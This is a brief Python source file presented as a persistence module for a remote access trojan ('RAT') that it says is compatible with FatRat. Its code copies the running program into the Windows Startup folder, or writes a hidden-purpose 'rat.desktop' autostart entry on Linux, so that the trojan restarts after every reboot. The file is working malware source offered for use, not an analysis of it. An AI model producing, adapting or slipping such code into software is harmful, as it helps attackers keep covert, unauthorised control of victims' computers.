#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Persistence Module - Ensures RAT survives reboot
Compatible with FatRat and other modules
"""
import os
import sys
import shutil

class Persistence:
    def __init__(self, target=None):
        self.target = target or sys.argv[0]

    def add_to_startup(self):
        if os.name == 'nt':
            startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            shutil.copy(self.target, startup)
            return f"Added to Windows startup: {startup}"
        else:
            autostart = os.path.expanduser('~/.config/autostart/')
            os.makedirs(autostart, exist_ok=True)
            desktop_file = os.path.join(autostart, 'rat.desktop')
            with open(desktop_file, 'w') as f:
                f.write(f"[Desktop Entry]\nType=Application\nExec={self.target}\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=rat\n")
            return f"Added to Linux autostart: {desktop_file}"

if __name__ == "__main__":
    p = Persistence()
    print(p.add_to_startup())
